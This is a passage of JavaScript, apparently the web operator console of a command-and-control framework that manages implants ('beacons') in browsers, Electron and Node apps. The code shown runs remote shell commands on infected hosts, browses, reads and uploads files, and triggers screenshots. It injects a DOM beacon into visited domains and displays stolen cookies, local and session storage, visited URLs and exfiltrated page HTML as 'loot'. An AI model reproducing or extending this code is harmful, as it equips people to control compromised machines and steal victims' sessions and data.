    'body { margin:0; padding:0; background:#1e1e1e; color:#ddd; font-family:monospace; font-size:14px; display:flex; flex-direction:column; height:100vh; }' +
    '#title-bar { background:#333; padding:6px 12px; display:flex; align-items:center; gap:8px; }' +
    '#title-input { background:transparent; border:1px solid #555; color:#ddd; font-size:14px; flex:1; padding:2px 6px; border-radius:3px; font-family:monospace; }' +
    '#title-input:focus { outline:none; border-color:#ddd; }' +
    '#output { flex:1; overflow-y:auto; padding:8px 12px; }' +
    '#input-bar { display:flex; align-items:center; padding:6px 12px; background:#252525; border-top:1px solid #444; gap:6px; }' +
    '#prompt { color:#ddd; white-space:nowrap; }' +
    '#cmd-input { flex:1; background:transparent; border:1px solid #555; color:#ddd; font-family:monospace; font-size:14px; padding:4px 6px; border-radius:3px; }' +
    '#cmd-input:focus { outline:none; border-color:#ddd; }' +
    '.btn-shell { background:#444; color:#ddd; border:1px solid #666; padding:4px 12px; border-radius:3px; cursor:pointer; font-size:13px; }' +
    '.btn-shell:hover { background:#555; }' +
    '</style></head><body>' +
    '<div id="title-bar"><span style="color:#ddd;font-weight:bold;">&#9638;</span>' +
    '<input id="title-input" value="' + escapeHTML(titleText).replace(/"/g, '&quot;') + '" oninput="document.title=this.value"></div>' +
    '<div id="output">' + transferState.output + '</div>' +
    '<div id="input-bar">' +
    '<span id="prompt">' + escapeHTML((transferState.cwd || '~') + ' $ ') + '</span>' +
    '<input id="cmd-input" type="text" autofocus>' +
    '<button class="btn-shell" id="run-btn">Run</button>' +
    '</div>' +
    '<script>' +
    '(function(){' +
    'var beaconId=' + JSON.stringify(transferState.beaconId) + ';' +
    'var cwd=' + JSON.stringify(transferState.cwd) + ';' +
    'var isWin=' + JSON.stringify(transferState.isWindows) + ';' +
    'var history=' + JSON.stringify(transferState.history) + ';' +
    'var histIdx=history.length;' +
    'var accOutput=document.getElementById("output").innerHTML;' +
    'function esc(s){if(!s)return"";return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/\'/g,"&#039;");}' +
    'function appendOut(h){accOutput+=h;var o=document.getElementById("output");o.innerHTML=accOutput;o.scrollTop=o.scrollHeight;}' +
    'function removeRunning(rid){var re=new RegExp(\'<div [^>]*id="shell-running-\'+rid.replace(/[.*+?^${}()|[\\]\\\\]/g,"\\\\$&")+\'"[^>]*>.*?</div>\');accOutput=accOutput.replace(re,"");var el=document.getElementById("shell-running-"+rid);if(el)el.remove();}' +
    'function updatePrompt(){var p=document.getElementById("prompt");p.textContent=(cwd||"~")+" $ ";}' +
    'function pollResult(reqId,cb,att){att=att||0;if(att>60){cb({success:false,error:"Timed out"});return;}var d=att<5?1000:3000;setTimeout(async function(){try{var r=await fetch("/api/sidecar/result/"+reqId);var j=await r.json();if(j.ready){cb(j);}else{pollResult(reqId,cb,att+1);}}catch(e){cb({success:false,error:"Poll failed: "+e});}},d);}' +
    'var cmdQueue=[];var queueRunning=false;' +
    'function runCmd(){var inp=document.getElementById("cmd-input");var raw=inp.value;if(!raw.trim())return;inp.value="";history.push(raw);histIdx=history.length;cmdQueue.push(raw);processQueue();}' +
    'function processQueue(){if(queueRunning||cmdQueue.length===0)return;queueRunning=true;runOne(cmdQueue.shift());}' +
    'async function runOne(raw){' +
    'var wrapped;if(isWin){var cwdEsc=cwd.replace(/"/g,\'""\');if(cwd){wrapped="cd /d \\""+cwdEsc+"\\" && "+raw+" & echo __SIDECAR_CWD__& cd";}else{wrapped=raw+" & echo __SIDECAR_CWD__& cd";}}' +
    'else{var cwdEsc=cwd.replace(/\'/g,"\'\\\\\'\'");if(cwd){wrapped="cd \'"+cwdEsc+"\' && "+raw+"; echo \'__SIDECAR_CWD__\'; pwd";}else{wrapped=raw+"; echo \'__SIDECAR_CWD__\'; pwd";}}' +
    'var pt=esc((cwd||"~")+" $ "+raw);var rid=Date.now()+""+Math.random();' +
    'appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+pt+"</div>");' +
    'appendOut(\'<div id="shell-running-\'+rid+\'" style="color:#888;"><span style="display:inline-block;width:12px;height:12px;border:2px solid #888;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;"></span> Running...</div>\');' +
    'try{var resp=await fetch("/api/sidecar/command",{method:"POST",body:JSON.stringify({beaconID:beaconId,command:"exec_cmd",args:{command:wrapped}}),headers:{"Content-type":"application/json"}});' +
    'if(!resp.ok){var et=await resp.text();removeRunning(rid);appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">ERROR: \'+esc(et)+"</div>");queueRunning=false;processQueue();return;}' +
    'var json=await resp.json();pollResult(json.requestId,function(result){removeRunning(rid);if(!result.success){appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">ERROR: \'+esc(result.error||"Unknown error")+"</div>");queueRunning=false;processQueue();return;}' +
    'var stdout=(result.data&&result.data.stdout)||"";var stderr=(result.data&&result.data.stderr)||"";' +
    'var mk="__SIDECAR_CWD__";var mi=stdout.lastIndexOf(mk);' +
    'if(mi!==-1){var co=stdout.substring(0,mi).replace(/\\n$/,"");var nc=stdout.substring(mi+mk.length).trim();if(nc)cwd=nc;if(co)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(co)+"</div>");}' +
    'else{if(stdout)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(stdout)+"</div>");}' +
    'if(stderr)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(stderr)+"</div>");updatePrompt();queueRunning=false;processQueue();});}' +
    'catch(e){removeRunning(rid);appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">Request failed: \'+esc(String(e))+"</div>");queueRunning=false;processQueue();}}' +
    'document.getElementById("cmd-input").addEventListener("keydown",function(ev){if(ev.key==="Enter"){runCmd();}else if(ev.key==="ArrowUp"){ev.preventDefault();if(histIdx>0){histIdx--;this.value=history[histIdx];}}else if(ev.key==="ArrowDown"){ev.preventDefault();if(histIdx<history.length-1){histIdx++;this.value=history[histIdx];}else{histIdx=history.length;this.value="";}}});' +
    'document.getElementById("run-btn").addEventListener("click",runCmd);' +
    'var o=document.getElementById("output");o.scrollTop=o.scrollHeight;' +
    '})();' +
    '</script>' +
    '<style>@keyframes spin{to{transform:rotate(360deg)}}</style>' +
    '</body></html>';

    popWin.document.write(htmlContent);
    popWin.document.close();
}


async function sidecarReadFile(beaconId, path) {
    var resultsDiv = document.getElementById('sidecar-file-results');
    if (!resultsDiv) return;
    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-secondary" role="status"></div> Reading file...';

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'read_file', args: { path: path } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            if (!result.success) {
                resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error || 'Unknown error') + '</div>';
                return;
            }
            var content = '';
            try { content = atob(result.data.content); } catch(e) { content = result.data.content || ''; }

            // Store for download
            _sidecarLastReadContent = result.data.content;
            var pathParts = path.replace(/\\/g, '/').split('/');
            _sidecarLastReadFileName = pathParts[pathParts.length - 1] || 'download';

            var backBtn = '<button class="btn btn-outline-secondary btn-sm mb-2" onclick="sidecarBrowse(\'' + beaconId + '\')">Back to directory</button>';
            var dlBtn = ' <button class="btn btn-primary btn-sm mb-2" onclick="sidecarDownloadFile()">Download</button>';
            resultsDiv.innerHTML = backBtn + dlBtn +
                '<div class="mb-1"><b>' + escapeHTML(path) + '</b> (' + formatSidecarBytes(result.data.size) + ')' +
                (result.data.truncated ? ' <span class="badge bg-warning text-dark">Truncated</span>' : '') + '</div>' +
                '<pre class="bg-dark text-white p-2" style="max-height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 0.8em;">' +
                escapeHTML(content) + '</pre>';
        });
    } catch (e) {
        resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Request failed: ' + escapeHTML(String(e)) + '</div>';
    }
}


function pollSidecarResult(requestId, callback, attempt) {
    attempt = attempt || 0;
    if (attempt > 60) { // ~3 minutes max
        callback({ success: false, error: "Timed out waiting for result" });
        return;
    }
    // Poll fast initially (1s for first 5 attempts), then slow down (3s)
    var delay = attempt < 5 ? 1000 : 3000;
    setTimeout(async function() {
        try {
            var resp = await fetch('/api/sidecar/result/' + requestId);
            var json = await resp.json();
            if (json.ready) {
                callback(json);
            } else {
                pollSidecarResult(requestId, callback, attempt + 1);
            }
        } catch (e) {
            callback({ success: false, error: "Poll failed: " + String(e) });
        }
    }, delay);
}


function formatSidecarBytes(bytes) {
    if (bytes === undefined || bytes === null) return '';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}


// ===== Atom Beacon Screenshot Controls =====

async function atomCaptureScreenshot(beaconId) {
    var btn = document.getElementById('sidecar-screenshot-btn');
    var status = document.getElementById('sidecar-screenshot-status');
    if (btn) btn.disabled = true;
    if (status) status.textContent = 'Sending capture request...';

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'screenshot', args: {} }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            if (status) status.textContent = 'Error: ' + errText;
            if (btn) btn.disabled = false;
            return;
        }

        var json = await resp.json();
        if (status) status.textContent = 'Waiting for capture...';

        pollSidecarResult(json.requestId, function(result) {
            if (btn) btn.disabled = false;
            if (result.success) {
                if (status) status.textContent = 'Screenshot captured! Check Loot tab.';
                showToast('Screenshot captured', 'success');
            } else {
                if (status) status.textContent = 'Failed: ' + (result.error || 'Unknown error');
            }
            // Clear status after a few seconds
            setTimeout(function() { if (status) status.textContent = ''; }, 5000);
        });
    } catch (e) {
        if (btn) btn.disabled = false;
        if (status) status.textContent = 'Request failed: ' + String(e);
    }
}

async function atomSaveScreenshotSettings(beaconId) {
    var settingsStatus = document.getElementById('atom-ss-settings-status');
    var settings = {
        onFocus: document.getElementById('atom-ss-on-focus')?.checked || false,
        onNavigate: document.getElementById('atom-ss-on-navigate')?.checked || false,
        onNewWindow: document.getElementById('atom-ss-on-newwindow')?.checked || false,
        cooldownSec: parseInt(document.getElementById('atom-ss-cooldown')?.value) || 30
    };

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'screenshot_settings', args: settings }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            if (settingsStatus) settingsStatus.textContent = 'Error: ' + errText;
            return;
        }

        if (settingsStatus) settingsStatus.textContent = 'Settings queued.';
        showToast('Screenshot settings sent', 'success');
        setTimeout(function() { if (settingsStatus) settingsStatus.textContent = ''; }, 3000);
    } catch (e) {
        if (settingsStatus) settingsStatus.textContent = 'Failed: ' + String(e);
    }
}


async function getClientDetails(id, autoRefresh)
{
    if (refreshingDetails) return;
    refreshingDetails = true;

    try {
        // Get client info to check type
        var clientsReq = await fetch('/api/getClients');
        var clients = await clientsReq.json();
        var client = clients.find(c => c.id == id);

        // Update persistence
        if (client) {
            if (client.clientType === 'bex-beacon') {
                lastSelectedBrowserId = client.id;
            } else if (client.clientType === 'atom-beacon') {
                lastSelectedElectronId = client.id;
            } else if (client.clientType === 'v8-beacon') {
                lastSelectedNodeId = client.id;
            } else {
                lastSelectedAppId = client.id;
            }
        }

        var cardStack = document.getElementById('detail-stack');
        var toolsStack = document.getElementById('tools-stack');
        const lootHeader = document.getElementById('loot-header-text');

        // Save scroll position
        const scrollPos = cardStack.scrollTop;

        // Update Header: toggle for beacon types, plain label for Apps
        if (client) {
            if (client.clientType === 'bex-beacon') {
                setupBeaconHeaderToggle('Browser');
            } else if (client.clientType === 'atom-beacon') {
                setupBeaconHeaderToggle('Electron');
            } else if (client.clientType === 'v8-beacon') {
                setupBeaconHeaderToggle('Node');
            } else {
                setupBeaconHeaderToggle('App');
            }
        }

        // Only clear if we are switching to a brand NEW client (not a refresh)
        // If we are refreshing the same client, we want to update in-place to avoid flashing
        const isRefresh = (cardStack.getAttribute('data-loaded-id') == id);

        if (!isRefresh) {
            while (cardStack.firstChild) {
                cardStack.firstChild.remove();
            }
            // Clear tools stack on client switch
            if (toolsStack) {
                while (toolsStack.firstChild) toolsStack.firstChild.remove();
            }
            cardStack.setAttribute('data-loaded-id', id);
            cardStack._lastMaxEventId = 0;

            // Reset sidecar shell state on client switch
            _sidecarCurrentPath = '';
            _sidecarShellCwd = '';
            _sidecarShellHistory = [];
            _sidecarShellHistoryIndex = -1;
            _sidecarShellOutput = '';
            _sidecarShellBeaconId = '';
            _sidecarShellNickname = '';
            _sidecarShellIsWindows = false;
        }

        if (client && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon')) {
            // Sidecar panel for beacon-type clients (if available)
            if (client.sidecarSupported) {
                let sidecarPanel = document.getElementById('sidecar-panel');
                var isBuiltinBeacon = client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon';
                var panelTitle = isBuiltinBeacon ? 'OS Tools' : 'Sidecar';
                var sidecarBadgeHtml;
                if (isBuiltinBeacon) {
                    sidecarBadgeHtml = '';
                } else {
                    sidecarBadgeHtml = client.sidecarConnected
                        ? '<span class="badge bg-success" id="sidecar-badge">Connected</span>'
                        : '<span class="badge bg-info" id="sidecar-badge">Supported</span>';
                }
                if (!sidecarPanel) {
                    // Store nickname and beacon id for shell
                    _sidecarShellNickname = client.tag || client.nickname || '';
                    _sidecarShellBeaconId = id;
                    _sidecarShellIsWindows = (client.platform || '').toLowerCase().indexOf('win') === 0;
                    var screenshotTabHtml = '';
                    var screenshotPaneHtml = '';

                    sidecarPanel = document.createElement('div');
                    sidecarPanel.id = 'sidecar-panel';
                    sidecarPanel.setAttribute('data-beacon-id', id);
                    sidecarPanel.className = 'card mb-3 border-secondary';
                    sidecarPanel.style.overflow = 'hidden';
                    sidecarPanel.innerHTML = `
                        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer;" data-bs-toggle="collapse" data-bs-target="#sidecar-collapse" aria-expanded="false" aria-controls="sidecar-collapse">
                            <span><b>${panelTitle}</b> ${sidecarBadgeHtml}</span>
                            <svg id="sidecar-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
                            </svg>
                        </div>
                        <div class="collapse" id="sidecar-collapse">
                        <div class="card-body p-2">
                            <ul class="nav nav-tabs" role="tablist">
                                <li class="nav-item">
                                    <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#sidecar-files" type="button">File Browser</button>
                                </li>
                                <li class="nav-item">
                                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#sidecar-shell" type="button">Shell</button>
                                </li>
                                ${screenshotTabHtml}
                            </ul>
                            <div class="tab-content border border-top-0 p-3">
                                <div class="tab-pane fade show active" id="sidecar-files">
                                    <div class="input-group mb-2">
                                        <input type="text" class="form-control form-control-sm" id="sidecar-path" placeholder="/" value="">
                                        <button class="btn btn-primary btn-sm" onclick="sidecarBrowse('${id}')">Browse</button>
                                    </div>
                                    <div class="d-flex gap-2 mb-2 align-items-center flex-wrap">
                                        <input type="file" class="form-control form-control-sm" id="sidecar-upload-file" style="max-width:250px;">
                                        <button class="btn btn-outline-secondary btn-sm" onclick="sidecarUploadFile('${id}')">Upload</button>
                                    </div>
                                    <div id="sidecar-upload-status"></div>
                                    <div id="sidecar-file-results" style="max-height: 400px; overflow-y: auto;"></div>
                                </div>
                                <div class="tab-pane fade" id="sidecar-shell">
                                    <div id="sidecar-shell-output" style="background:#1e1e1e; color:#ddd; font-family:monospace; font-size:13px; max-height:400px; overflow-y:auto; padding:8px 10px; border-radius:4px; margin-bottom:8px;"></div>
                                    <div class="input-group">
                                        <span class="input-group-text bg-dark text-white border-secondary" id="sidecar-shell-prompt" style="font-family:monospace; font-size:13px;">~ $ </span>
                                        <input type="text" class="form-control form-control-sm bg-dark text-white border-secondary" id="sidecar-shell-input" style="font-family:monospace;" placeholder="type a command..." onkeydown="sidecarShellKeyHandler(event, '${id}')">
                                        <button class="btn btn-primary btn-sm" onclick="sidecarShellExec('${id}')">Run</button>
                                        <button class="btn btn-outline-light btn-sm" onclick="sidecarPopOutShell('${id}')" title="Pop out shell into separate window">Pop Out</button>
                                    </div>
                                </div>
                                ${screenshotPaneHtml}
                            </div>
                        </div>
                        </div>
                    `;
                    toolsStack.appendChild(sidecarPanel);

                    // Chevron rotation on collapse/expand
                    var collapseEl = document.getElementById('sidecar-collapse');
                    if (collapseEl) {
                        collapseEl.addEventListener('hide.bs.collapse', function() {
                            var chev = document.getElementById('sidecar-chevron');
                            if (chev) chev.style.transform = 'rotate(-90deg)';
                        });
                        collapseEl.addEventListener('show.bs.collapse', function() {
                            var chev = document.getElementById('sidecar-chevron');
                            if (chev) chev.style.transform = 'rotate(0deg)';
                        });

                        // Browse home directory on first expand
                        collapseEl.addEventListener('show.bs.collapse', function browseOnce() {
                            collapseEl.removeEventListener('show.bs.collapse', browseOnce);
                            sidecarBrowse(id);
                        });
                    }
                } else {
                    // Panel exists — update the badge on refresh
                    var existingBadge = sidecarPanel.querySelector('#sidecar-badge');
                    if (existingBadge && !isBuiltinBeacon) {
                        // Only update connection state for bex-beacon (sidecar binary)
                        if (client.sidecarConnected) {
                            existingBadge.className = 'badge bg-success';
                            existingBadge.textContent = 'Connected';
                        } else {
                            existingBadge.className = 'badge bg-info';
                            existingBadge.textContent = 'Supported';
                        }
                    }
                }
            }

            // Proxy panel -> tools stack (rendered first, above sidecar; browser-extension only)
            var proxyState = { isActive: false };
            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
                try { proxyState = await renderProxyPanel(toolsStack, id, client) || proxyState; } catch(e) { console.error('Proxy panel error:', e); }
            }

            // Beacon Callback panel for BEX, Atom, and V8 beacons
            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
                try { renderBeaconCallbackPanel(toolsStack, id, client.clientType); } catch(e) { console.error('Beacon Callback panel error:', e); }
            }

            // Screenshots panel for atom-beacon clients only (no GUI on v8-beacon)
            if (client.clientType === 'atom-beacon') {
                try { renderScreenshotPanel(toolsStack, id); } catch(e) { console.error('Screenshot panel error:', e); }
            }

            // Plugin panel for atom-beacon clients only (not v8-beacon)
            if (client.clientType === 'atom-beacon') {
                try { await renderPluginPanel(toolsStack, id, client); } catch(e) { console.error('Plugin panel error:', e); }
            }

            // Atom-beacon and v8-beacon use app-style event timeline, not domain view
            if (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
                // Close the beacon block — fall through to app-style event view below
            } else {

            var domainsReq = await fetch('/api/jstap/domains/' + id);
            var domains = await domainsReq.json();

            // Fetch active injections
            var injectionsReq = await fetch('/api/jstap/injections/' + id);
            var injections = await injectionsReq.json();
            var activeMap = {};
            injections.forEach(i => activeMap[i.domain] = { tag: i.tag, success: i.last_success });

            // Get all clients to find children
            var children = clients.filter(c => c.parentUUID === client.uuid);

            if (domains.length === 0) {
                // Only insert placeholder if not already present (avoids duplication on refresh)
                if (!cardStack.querySelector('#bex-no-domains-placeholder')) {
                    cardStack.innerHTML = `
                        <div id="bex-no-domains-placeholder" class="mt-4 p-5 bg-dark text-white rounded text-center">
                            <h3>No Domains Recorded</h3>
                            <p class="text-white-50">This beacon has not reported any domain intelligence yet.</p>
                        </div>
                    `;
                }
                switchBexTab(activeBexTab);
                return;
            }

            // Remove placeholder if it exists (domains have arrived since last render)
            var placeholder = cardStack.querySelector('#bex-no-domains-placeholder');
            if (placeholder) placeholder.remove();

            // Sort domains by last seen
            var newestFirst = document.getElementById('lootSortNewest').checked;
            if (newestFirst) {
                domains.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
            } else {
                domains.sort((a, b) => new Date(a.lastSeen) - new Date(b.lastSeen));
            }

            for (let d of domains) {
                // Look for existing card to update in-place
                let card = document.getElementById('domain-card-' + d.id);
                let isNew = false;

                if (!card) {
                    isNew = true;
                    card = document.createElement('div');
                    card.className = 'card mb-2';
                    card.id = 'domain-card-' + d.id;
                    card.innerHTML = `
                        <div class="card-body">
                            <div class="header-area d-flex justify-content-between align-items-center mb-2"></div>
                            <div class="stats-area mb-2 text-muted small"></div>
                            <div class="controls-area d-flex justify-content-start align-items-center gap-2 mb-3"></div>
                            <div class="children-area"></div>
                            <div class="details-area mt-3" style="display: none;" id="domain-details-${d.id}"></div>
                        </div>
                    `;
                }

                const headerArea = card.querySelector('.header-area');
                const statsArea = card.querySelector('.stats-area');
                const controlsArea = card.querySelector('.controls-area');
                const childrenArea = card.querySelector('.children-area');

                // 1. Update Header (Title + Badges)
                let badgeHtml = '';
                if (activeMap[d.domain]) {
                    const info = activeMap[d.domain];
                    const statusColor = info.success ? 'bg-success' : 'bg-warning text-dark';
                    const childForDomain = children.find(c => c.tag === info.tag);
                    const name = childForDomain ? (childForDomain.tag ? `${childForDomain.tag}/${childForDomain.nickname}` : childForDomain.nickname) : null;
                    const nicknameSuffix = name ? ` (${escapeHTML(name)})` : '';
                    const statusText  = info.success ? `SUCCESS: ${escapeHTML(info.tag)}${nicknameSuffix}` : `INJECTING: ${escapeHTML(info.tag)}`;
                    badgeHtml = `<span class="badge ${statusColor}" style="font-size: 0.6em; vertical-align: middle;">${statusText}</span>`;
                }
                headerArea.innerHTML = `<h5 class="card-title mb-0"><b>${escapeHTML(d.domain)}</b> ${badgeHtml}</h5>
                                        <small class="text-muted">Last Seen: ${humanized_time_span(d.lastSeen)}</small>`;

                // 2. Update Stats
                statsArea.innerHTML = `Visits: <b>${d.visitCount}</b>` + 
                    (d.lastUrl ? ` &bull; Last URL: <span class="text-truncate d-inline-block" style="max-width: 300px; vertical-align: bottom;" title="${escapeHTML(d.lastUrl)}">${escapeHTML(d.lastUrl)}</span>` : '');

                // 3. Update Controls (Only if state changed or new)
                const currentActionText = activeMap[d.domain] ? 'Stop Injection' : 'Inject DOM Beacon';
                const currentActionClass = activeMap[d.domain] ? 'btn-secondary' : 'btn-primary';
                
                if (isNew || !controlsArea.querySelector(`.${currentActionClass}`)) {
                    controlsArea.innerHTML = '';
                    
                    const injectBtn = document.createElement('button');
                    injectBtn.style.minWidth = "120px";
                    injectBtn.className = `btn ${currentActionClass} btn-sm`;
                    injectBtn.textContent = currentActionText;
                    injectBtn.onclick = function() { toggleBexInjection(id, d.domain, !!activeMap[d.domain]); };
                    controlsArea.appendChild(injectBtn);

                    const sessionTicketBtn = document.createElement('button');
                    sessionTicketBtn.style.minWidth = "120px";
                    sessionTicketBtn.className = 'btn btn-primary btn-sm';
                    sessionTicketBtn.textContent = 'Session Ticket';
                    sessionTicketBtn.onclick = function() { generateSessionTicket(d.id); };
                    controlsArea.appendChild(sessionTicketBtn);

                    const captureBtn = document.createElement('button');
                    captureBtn.style.minWidth = "120px";
                    captureBtn.className = 'btn btn-primary btn-sm';
                    captureBtn.textContent = 'View Details';
                    captureBtn.onclick = function() { toggleDomainDetails(d.id, this); };
                    controlsArea.appendChild(captureBtn);

                }

                // 4. Update Children Summary
                const domainChildren = activeMap[d.domain] ? children.filter(c => c.tag === activeMap[d.domain].tag) : [];
                if (domainChildren.length > 0) {
                    childrenArea.className = 'children-area mt-2 border-top pt-2';
                    childrenArea.innerHTML = `<small class="text-muted">Spawned Implants:</small>`;
                    domainChildren.forEach(child => {
                        const badge = document.createElement('div');
                        badge.className = 'badge bg-dark text-white me-1 p-1';
                        badge.style.cursor = 'pointer';
                        const name = child.tag ? `${escapeHTML(child.tag)}/${escapeHTML(child.nickname)}` : escapeHTML(child.nickname);
                        badge.innerHTML = `<small>${name}</small>`;
                        badge.onclick = (e) => {
                            e.stopPropagation();
                            document.getElementById('toggleApps').click();
                            setTimeout(() => {
                                const childCard = document.getElementById('clientCard' + child.id);
                                if (childCard) childCard.click();
                            }, 100);
                        };
                        childrenArea.appendChild(badge);
                    });
                } else {
                    childrenArea.innerHTML = '';
                    childrenArea.className = 'children-area';
                }

                if (isNew) {
                    cardStack.appendChild(card);
                }
            }
            // Restore scroll position
            if (scrollPos > 0) {
                cardStack.scrollTop = scrollPos;
            }

            // Enforce tab visibility
            switchBexTab(activeBexTab);
            return;
            } // end bex-beacon domain view else block
        }

        // Tools panels for DOM beacon / App clients
        if (client && client.clientType === 'js-implant') {
            try { renderBeaconCallbackPanel(toolsStack, id, 'js-implant'); } catch(e) { console.error('Beacon Callback panel error:', e); }
            try { renderDomScreenshotPanel(toolsStack, id); } catch(e) { console.error('DOM Screenshot panel error:', e); }
        }

        // Get high level event stack for client (Standard Implant / Atom Beacon)
        var req = await fetch('/api/clientEvents/' + id);
        var jsonResponse = await req.json();

        // Determine which events to render
        var newestFirst = document.getElementById('lootSortNewest').checked;
        var lastMaxEventId = cardStack._lastMaxEventId || 0;
        var newEvents;

        if (autoRefresh && isRefresh && lastMaxEventId > 0) {
            // Auto-refresh: only render events newer than what we already have
            newEvents = jsonResponse.filter(e => e.id > lastMaxEventId);
            if (newEvents.length === 0) {
                // Nothing new — skip entirely, preserve scroll
                if (client && (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon' || client.clientType === 'js-implant')) {
                    switchBexTab(activeBexTab);
                }
                return;
            }
            // Sort new events for display
            if (newestFirst) {
                newEvents.reverse();
            }
        } else {
            // Full render: manual click or first load
            if (newestFirst) {
                jsonResponse.reverse();
            }
            newEvents = jsonResponse;

            // Clear existing cards
            while (cardStack.firstChild) {
                cardStack.firstChild.remove();
            }
        }

        // Track max event ID across all events (not just new ones)
        var maxId = 0;
        for (var ei = 0; ei < jsonResponse.length; ei++) {
            if (jsonResponse[ei].id > maxId) maxId = jsonResponse[ei].id;
        }
        cardStack._lastMaxEventId = maxId;

        // Render new event cards
        for (let i = 0; i < newEvents.length; i++)
        {
            event = newEvents[i];
            var eventKey = event.eventID;

            var card = document.createElement('div');
            card.className ='card';

            var cardBody = document.createElement('div');
            cardBody.className = 'card-body';

            var cardTitle = document.createElement('h5');
            cardTitle.className = "card-title";

            var cardSubtitle = document.createElement('h6');

            // Add tooltip
            cardSubtitle.className = "card-subtitle mb-2 text-muted";
            cardSubtitle.setAttribute("data-toggle", "tooltip")
            cardSubtitle.setAttribute("title", event.timeStamp);
            cardSubtitle.setAttribute("data-placement", "left");
            const tooltipOptions = {
            animation: true, // Optional: Enable tooltip animation
            delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
            container: cardSubtitle // Optional: Specify a container for the tooltip
        };
        new bootstrap.Tooltip(cardSubtitle, tooltipOptions);


        var cardText = document.createElement('p');
        cardText.className = 'card-text';

        var activeEvent = false;


            // Handle event specific details and formatting
        switch(event.eventType)
        {
        case 'COOKIE':
            if (document.getElementById('cookieEvents').checked == true)
            {
                activeEvent = true;
                cookieReq  = await fetch('/api/clientCookie/' + eventKey);
                cookieJson = await cookieReq.json();

                cardTitle.innerHTML = "Cookie";
                cardText.innerHTML  = "Cookie Name: <b>" + escapeHTML(cookieJson.cookieName) + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Cookie Value: <b>" + escapeHTML(cookieJson.cookieValue) + "</b>";
            }
            break;

        case 'LOCALSTORAGE':
            if (document.getElementById('localStorageEvents').checked == true)
            {
                activeEvent = true;
                localStorageReq  = await fetch('/api/clientLocalStorage/' + eventKey);
                localStorageJson = await localStorageReq.json();

                // console.log("*** Local storage api call received: ");
                // console.log(JSON.stringify(localStorageJson));
                cardTitle.innerHTML = "Local Storage";
                cardText.innerHTML  = "Key: <b>" + escapeHTML(localStorageJson.localStorageKey) + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Value: <b>" + escapeHTML(localStorageJson.localStorageValue) + "</b>";
            }
            break;

        case 'SESSIONSTORAGE':
            if (document.getElementById('sessionStorageEvents').checked == true)
            {
                activeEvent = true;
                sessionStorageReq  = await fetch('/api/clientSessionStorage/' + eventKey);
                sessionStorageJson = await sessionStorageReq.json();

                cardTitle.innerHTML = "Session Storage";
                cardText.innerHTML  = "Key: <b>" + escapeHTML(sessionStorageJson.sessionStorageKey) + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Value: <b>" + escapeHTML(sessionStorageJson.sessionStorageValue) + "</b>";
            }
            break;

        case 'URLVISITED':
            if (document.getElementById('urlEvents').checked == true)
            {
                activeEvent = true;
                urlVisitedReq  = await fetch('/api/clientUrl/' + eventKey);
                urlVisitedJson = await urlVisitedReq.json();

                cardTitle.innerHTML = "URL Visited";
                cardText.innerHTML  = "URL: <b>" + escapeHTML(urlVisitedJson.url) + "</b>";
            }
            break;

        case 'HTML':
            if (document.getElementById('htmlScrapeEvents').checked == true)
            {
                activeEvent = true;
                cardTitle.innerHTML = "HTML Scraped";
                cardText.innerHTML  = "HTML exfiltrated from page.<br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick=showHtmlCode(' + `'` + eventKey + `'`+ ')>View Code</button>';
            }
            break;

        case 'SCREENSHOT':
            if (document.getElementById('screenshotEvents').checked == true)
            {
